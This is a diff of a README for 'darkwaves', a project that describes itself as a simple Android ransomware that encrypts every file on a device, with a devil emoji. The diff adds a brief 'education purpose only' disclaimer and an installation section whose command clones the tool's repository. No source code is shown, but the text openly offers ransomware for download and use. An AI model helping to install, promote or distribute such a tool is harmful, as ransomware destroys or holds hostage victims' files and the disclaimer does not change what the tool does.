@@ -1,8 +1,9 @@
 <img title="darkwaves" src="https://img.shields.io/badge/CODENAME%20-darkwaves-SCRIPT?colorA=grey&colorB=blue&style=for-the-badge"> <img title="darkwaves" src="https://img.shields.io/badge/VERSION%20-1.5-SCRIPT?colorA=grey&colorB=blue&style=for-the-badge">
 # darkwaves
 this is a simple android ransomware, it will encrypted all the files in your android device 😈
-
-### how to install on Termux:
+### Disclaimer
+This tool is made for education purpose only, the author is not responsible for any loses or damage caused by this programs
+### Installation
 
     git clone https://github.com/Shadow8021/darkwaves.git
 
